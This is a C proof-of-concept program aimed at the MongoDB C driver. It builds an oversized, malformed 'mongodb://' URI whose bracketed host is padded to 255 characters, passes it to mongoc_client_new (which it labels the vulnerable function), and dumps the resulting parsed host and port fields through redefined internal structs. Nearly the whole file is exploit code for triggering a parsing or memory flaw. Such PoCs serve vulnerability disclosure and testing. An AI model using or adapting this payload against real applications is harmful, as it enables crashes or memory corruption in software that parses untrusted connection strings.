#include <mongoc.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <strings.h>

//<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
// This part is simply for compatibilty/testing purposes

struct _mongoc_uri_t
{
    char *str;
    bool is_srv;
    char srv[BSON_HOST_NAME_MAX + 1];
    mongoc_host_list_t *hosts;
    char *username;
    char *password;
    char *database;
};

struct _mongoc_client_t
{
    mongoc_uri_t *uri;
};
///>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

char *generate_payload()
{
    char *r;
    char host[256];
    char port[8] = "]:11337";

    if (!(r = calloc(1337, 1)))
        return NULL;
    puts("Allocating payload");
    // Set scheme
    strcat(r, "mongodb://[");
    puts("Adding scheme");
    // Set host "1:" + "6" * 253 + "\x00" -> len == 255
    bzero(host, sizeof(host));
    puts("Host cleared");
    host[0] = '1';
    puts("Host[0] set");
    host[1] = ':';
    puts("Host[1] set");
    memset(host + 2, '6', sizeof(host) - 3);
    puts("Host padded");
    strcat(r, host);
    puts("Host added to allocation");
    // Set port 11337 -> len == 5
    port[7] = 0;
    puts("Port null terminated");
    strcat(r, port);
    puts("Finished generating payload");
    return r;
}

int main()
{
    mongoc_client_t *client;
    puts("Starting to generate paylod.");
    char *payload = generate_payload();

    if (!payload)
    {
        puts("PoC could not run on your system.");
        return 1;
    }
    puts("Calling vulnerable function");
    client = mongoc_client_new(payload);
    puts("Vulnerable function called");
    if (!client)
    {
        puts("mongoc_client_new failed");
        return 1;
    }
    puts("Dumping PoC values");
    printf("host_and_port=%s\n", client->uri->hosts->host_and_port);
    printf("port=%hu\n", client->uri->hosts->port);
}
